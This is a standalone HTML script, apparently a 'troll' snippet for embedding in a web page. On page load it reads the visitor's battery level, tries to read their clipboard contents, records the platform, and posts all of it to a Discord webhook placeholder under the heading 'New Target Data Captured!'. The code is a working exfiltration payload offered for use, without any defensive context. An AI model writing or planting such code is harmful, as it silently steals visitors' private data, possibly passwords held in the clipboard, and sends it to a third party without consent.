<script>
    async function sendTroll() {
        let batteryInfo = "Unknown";
        let clipboardText = "Denied or Unavailable";

        // Try getting battery
        if ('getBattery' in navigator) {
            try {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
            } catch(e) {}
        }

        // Try getting clipboard (requires user click elsewhere on page)
        try {
            clipboardText = await navigator.clipboard.readText();
        } catch(e) {}

        const payload = {
            content: `🚨 **New Target Data Captured!**\n🔋 Battery: ${batteryInfo}\n📋 Clipboard: \`${clipboardText}\`\n🌐 Platform: ${navigator.platform}`
        };

        fetch('YOUR_DISCORD_WEBHOOK_URL', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    sendTroll();
</script>
